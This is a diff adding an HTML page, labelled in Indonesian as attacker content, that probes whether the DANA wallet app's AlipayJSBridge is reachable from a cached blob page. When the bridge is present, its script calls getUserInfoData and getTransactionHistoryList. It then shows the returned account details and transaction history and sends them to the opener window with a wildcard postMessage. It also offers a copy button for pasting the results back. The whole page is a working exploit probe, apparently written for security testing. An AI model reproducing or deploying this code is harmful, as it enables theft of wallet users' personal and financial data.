@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>RESOURCE SHELL PROBE v13</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:13px}
+  h3{color:#ff0;margin:10px 0 6px;font-size:14px}
+  #verdict{font-size:26px;font-weight:bold;text-align:center;padding:18px 8px;border:3px solid #888;margin:10px 0;word-break:break-word}
+  #verdict.yes{color:#0f0;border-color:#0f0;background:#020}
+  #verdict.no{color:#f55;border-color:#f55;background:#200}
+  #verdict.wait{color:#ff0;border-color:#ff0}
+  .sub{font-size:15px;text-align:center;color:#0ff;margin:4px 0;font-weight:bold}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:260px;overflow:auto}
+  button{width:100%;padding:16px;font-size:16px;background:#050;color:#0f0;border:2px solid #0f0;font-weight:bold;margin:10px 0}
+  .note{color:#0ff;margin:6px 0}
+</style>
+</head>
+<body>
+<h3>RESOURCE-CACHE WEB-SHELL PROBE (v13 payload)</h3>
+<p class="note">Halaman ini = konten ATTACKER yang di-host via resource-cache DANA (downloadFile), dibuka sebagai halaman top-level via blob. Kalau bridge aktif di sini = web-shell penuh.</p>
+<div id="verdict" class="wait">CEK BRIDGE...</div>
+<div class="sub" id="subpii"></div>
+<div class="sub" id="subtrx"></div>
+<pre id="env">checking bridge...</pre>
+<pre id="pii">pending</pre>
+<pre id="trx">pending</pre>
+<button onclick="copyRes()">COPY HASIL PROBE INI</button>
+<script>
+(function(){
+  var R = {};
+  var posted = 0;
+  window.__v13res = 'RES13-OK-' + (location.href || '').slice(0, 40);
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function post(stage, data){
+    try { if (window.opener) window.opener.postMessage({__v13popup:true, stage:stage, data:data}, '*'); } catch(e){}
+  }
+  function set(id, o){
+    var el = document.getElementById(id);
+    try { el.textContent = (typeof o === 'string') ? o : JSON.stringify(o, null, 1); } catch(e) { el.textContent = String(o); }
+    R[id] = o;
+  }
+  function verdict(txt, cls){
+    var el = document.getElementById('verdict');
+    el.textContent = txt;
+    el.className = cls;
+  }
+  function sub(id, txt){
+    document.getElementById(id).textContent = txt;
+  }
+  window.copyRes = function(){
+    var lines = ['resourceProbe13 @ ' + location.href,
+      'env: ' + compact(R.env || null),
+      'pii: ' + compact(R.pii || null),
+      'trx: ' + compact(R.trx || null)];
+    var ta = document.createElement('textarea');
+    ta.value = lines.join('\n');
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); alert('copied - paste balik'); } catch(e) { alert('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+
+  var done = false;
+  var piiDone = false;
+  var trxDone = false;
+  function summary(){
+    return {env:R.env || null, piiHead:R.pii?compact(R.pii).slice(0,300):null, piiBytes:R.pii?compact(R.pii).length:0, trxHead:R.trx?compact(R.trx).slice(0,200):null, trxBytes:R.trx?compact(R.trx).length:0};
+  }
+  function finalPost(){
+    if (posted > 6) return;
+    posted++;
+    post('final', summary());
+    setTimeout(finalPost, 3000);
+  }
+  function finish(){
+    finalPost();
+  }
+  function go(){
+    if (done) return; done = true;
+    var hasB = !!window.AlipayJSBridge;
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    var org = '?';
+    try { org = location.origin; } catch(e){}
+    var env = {hasBridge:hasB, appId:sp.appId, startScene:sp.startScene||sp.scene, href:(location.href||'').slice(0,90), origin:org, ts:new Date().toISOString()};
+    set('env', env);
+    post('boot', env);
+    if (hasB){
+      verdict('BRIDGE: ADA - WEB-SHELL AKTIF', 'yes');
+      post('bridge', {hasBridge:true, appId:sp.appId});
+      var got = false;
+      try {
+        window.AlipayJSBridge.call('getUserInfoData', {event:'getUserInformation', info:{queryBy:'all'}}, function(r){
+          got = true;
+          R.pii = r; set('pii', r);
+          sub('subpii', 'DATA AKUN: TERBACA (' + compact(r).length + ' byte)');
+          post('pii', compact(r).slice(0,400));
+          try {
+            window.AlipayJSBridge.call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false}, function(t){
+              R.trx = t; set('trx', t);
+              sub('subtrx', 'DATA TRANSAKSI: TERBACA (' + compact(t).length + ' byte)');
+              post('trx', compact(t).slice(0,300));
+              finish();
+            });
+          } catch(e2){
+            R.trx = {__exception:String(e2)}; set('trx', R.trx); post('trx', R.trx); finish();
+          }
+        });
+      } catch(e){
+        got = true;
+        R.pii = {__exception:String(e)}; set('pii', R.pii); post('pii', R.pii); finish();
+      }
+      setTimeout(function(){
+        if (!got){
+          R.pii = {timeoutNoCallback:10000}; set('pii', R.pii);
+          sub('subpii', 'DATA AKUN: timeout');
+          post('pii', R.pii);
+          finish();
+        }
+      }, 10000);
+      setTimeout(function(){
+        if (piiDone && !trxDone){ /* noop guard */ }
+      }, 1000);
+    } else {
+      verdict('BRIDGE: TIDAK ADA', 'no');
+      post('bridge', {hasBridge:false});
+      set('pii', {noBridge:'bridge tidak tersedia di context ini'});
+      set('trx', {noBridge:'bridge tidak tersedia di context ini'});
+      finish();
+    }
+  }
+  if (window.AlipayJSBridge) return go();
+  document.addEventListener('AlipayJSBridgeReady', go, false);
+  setTimeout(go, 5000);
+})();
+</script>
+</body>
+</html>
